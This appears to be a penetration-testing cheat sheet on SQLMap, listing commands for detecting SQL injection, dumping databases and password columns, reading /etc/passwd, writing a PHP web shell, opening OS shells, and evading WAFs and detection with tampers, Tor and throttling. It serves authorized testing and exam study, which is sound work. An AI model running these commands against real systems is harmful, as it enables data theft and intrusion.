# 25 — SQLMap Essentials

Automated SQL injection detection and exploitation. SQLMap is verbose; learn the right combination of flags for the situation rather than trying to memorize every option.

## Install / update

```bash
sudo apt install sqlmap
sqlmap --update
# or:
git clone https://github.com/sqlmapproject/sqlmap.git
python3 sqlmap/sqlmap.py
```

## Workflow

```
1. Capture a real request (Burp → Save item → request.txt)
2. Run sqlmap on that request to detect injection
3. Bump risk/level if nothing is found
4. If found: enumerate DBs / tables / columns / dump
5. Optionally: file read/write, OS shell, SQL shell
```

## Basic invocation

```bash
# URL with parameters
sqlmap -u 'https://target/page.php?id=1' --batch

# Named parameter only
sqlmap -u 'https://target/page.php?id=1&t=2' -p id --batch

# POST body
sqlmap -u 'https://target/login' --data 'user=admin&pass=x' --batch

# JSON body
sqlmap -u 'https://target/api' --data '{"id":1}' --headers='Content-Type: application/json' --batch

# Cookie / session
sqlmap -u 'https://target/dash' --cookie 'PHPSESSID=abc; auth=1' --batch

# Use a saved Burp request file
sqlmap -r request.txt --batch

# Force HTTPS / proxy through Burp
sqlmap -r req.txt --proxy=http://127.0.0.1:8080 --batch

# Specific DBMS (skip fingerprint)
sqlmap -r req.txt --dbms=mysql --batch
```

`--batch` answers prompts with defaults; great in lab/exam, fine for lab-like targets, drop it for production assessments where prompts catch unsafe choices.

## Detection knobs

```
--level=1..5     # how many checks (headers, cookies, etc.) - default 1
--risk=1..3      # how aggressive the payloads are - default 1
--technique=BEUSTQ
                  B: Boolean blind
                  E: Error-based
                  U: UNION
                  S: Stacked queries
                  T: Time blind
                  Q: Inline queries (rare)
--prefix=')'     # prepend before payload
--suffix='-- '   # append after payload
--string='Welcome'   # consider response with this string a "true"
--not-string='Invalid'
--code=200       # consider this status a "true"
```

Reasonable upgrade path when defaults find nothing:

```bash
sqlmap -r req.txt --level=3 --risk=2 --batch
sqlmap -r req.txt --level=5 --risk=3 --batch
```

## Enumeration

```bash
# DBMS info / current user
sqlmap -r req.txt --banner --current-user --current-db --is-dba --hostname --batch

# All databases
sqlmap -r req.txt --dbs --batch

# Tables in a DB
sqlmap -r req.txt -D <db> --tables --batch

# Columns in a table
sqlmap -r req.txt -D <db> -T <tbl> --columns --batch

# Dump rows
sqlmap -r req.txt -D <db> -T <tbl> --dump --batch
sqlmap -r req.txt -D <db> -T <tbl> -C 'username,password' --dump --batch
sqlmap -r req.txt -D <db> -T users --where "id<10" --dump --batch

# Search by name (when you don't know schema yet)
sqlmap -r req.txt --search -T 'user' --batch
sqlmap -r req.txt --search -C 'pass' --batch
```

`--dump-all --exclude-sysdbs` is the "give me everything except built-in DBs" shortcut; only run with explicit authorization on real engagements.

## File operations

```bash
# Read remote file (FILE priv on MySQL, similar on others)
sqlmap -r req.txt --file-read=/etc/passwd --batch

# Write a local file to the target
sqlmap -r req.txt --file-write=./shell.php --file-dest=/var/www/html/shell.php --batch
```

The `file-write` path needs a writable web-accessible directory and DB privileges to write files.

## Shells

```bash
# OS command shell (uses xp_cmdshell, COPY PROGRAM, into outfile + LFI, etc.)
sqlmap -r req.txt --os-shell --batch

# OS pseudo-terminal (where supported)
sqlmap -r req.txt --os-pwn --batch

# SQL shell (interactive query prompt over the injection)
sqlmap -r req.txt --sql-shell --batch

# Run an arbitrary SQL query
sqlmap -r req.txt --sql-query "SELECT @@version" --batch
```

## Tamper scripts (filter / WAF bypass)

```bash
sqlmap -r req.txt --tamper=between,space2comment,charunicodeencode --batch
sqlmap --list-tampers
```

Common tampers:

| Script | Effect |
|---|---|
| `space2comment` | Replace spaces with `/**/` |
| `space2hash` (MySQL) | Replace spaces with `#%0a` |
| `between` | Replace `=` with `BETWEEN` |
| `equaltolike` | Replace `=` with `LIKE` |
| `randomcase` | Mixed-case keywords |
| `charunicodeencode` | URL-unicode encode |
| `apostrophenullencode` | `'` → `%00%27` |
| `bluecoat` / `modsecurityzeroversioned` / `securesphere` | WAF-targeted |
| `versionedmorekeywords` (MySQL) | `/*!12345SELECT*/` style |
| `concat2concatws` | Replace `CONCAT()` |

Chain tampers in the order they should apply.

## Performance / stealth

```
--threads=10           # parallel requests (max 10)
--delay=0.5            # delay between requests (sec)
--timeout=30
--retries=2
--random-agent         # random User-Agent each run
--user-agent='...'     # custom UA
--mobile               # pretend to be mobile (template UA + viewport)
--tor                  # route through Tor (Tor must be running)
--check-tor
```

For low-and-slow:

```bash
sqlmap -r req.txt --random-agent --delay=2 --threads=1 --batch
```

## Session continuity

SQLMap caches per-target results in `~/.local/share/sqlmap/` (or `--output-dir=PATH`).

```bash
sqlmap -r req.txt --flush-session       # discard cached findings
sqlmap -r req.txt --fresh-queries        # ignore cached query results
sqlmap -r req.txt --output-dir=./sqlmap-loot  # use this engagement's loot dir
```

The cache is a feature: subsequent runs jump straight to enumeration once injection is confirmed.

## Useful auxiliary flags

```
--crawl=2                # spider the app from the URL given, fuzz forms
--forms                  # parse and test forms in the response
--smart                   # only test parameters that look injectable (faster)
--titles                 # compare response <title> for boolean blind
--text-only              # use textual content (strip HTML tags)
--null-connection         # HEAD-only optimization for size-based blind
--keep-alive
--skip='param1,param2'   # exclude parameters
--skip-static            # don't test obviously-static params
--skip-waf               # skip WAF detection step
--ignore-code=401,404
--invalid-bignum         # use big numbers (vs `-1`) as 'false' tests
--invalid-string
--ignore-redirects
--http2                  # force HTTP/2
```

## Combining with Burp

The cleanest workflow:

1. Drive the app through Burp until you find a parameter you suspect.
2. Right-click request → Copy to file (`request.txt`).
3. `sqlmap -r request.txt --batch`.
4. SQLMap's traffic also goes through Burp if you add `--proxy=http://127.0.0.1:8080`; useful for evidence and to verify what it actually sent.

## Common gotchas

- **CSRF tokens** — use `--csrf-url=URL --csrf-token=name`. SQLMap will fetch a fresh token before each attempt.
- **WAF / Cloudflare** — start with `--random-agent`, then specific tampers. If detection itself trips the WAF, raise `--delay`.
- **Authentication that expires** — pass a working session in `--cookie` and re-grab when it dies; or use `--load-cookies=cookies.txt` (Netscape format) and refresh from your browser.
- **Custom encoding** — wrap in `--prefix`/`--suffix` and pre-encode with `--tamper`.
- **Same-page error** — set `--code=200 --string='Welcome'` (or `--not-string='Invalid'`) so SQLMap can tell true from false on identical-status responses.
- **Non-injectable params** — test individual parameters with `-p`. SQLMap skipping `id` is a common false positive when the value is reflected but never reaches the DB.

## Reporting

The verbose log written to `~/.local/share/sqlmap/output/<target>/log` is your evidence. Key items:

- The exact payload(s) confirmed.
- The injection technique(s) used.
- Backend DBMS + version.
- Sample of extracted data (redacted in the report).
- Time-to-exploit (so the customer understands ease of attack).

Cite the request file (`request.txt`) and the SQLMap command line in your finding.

## Sources

- SQLMap docs: https://sqlmap.org/
- Source / wiki: https://github.com/sqlmapproject/sqlmap
- Tampers reference: https://github.com/sqlmapproject/sqlmap/tree/master/tamper
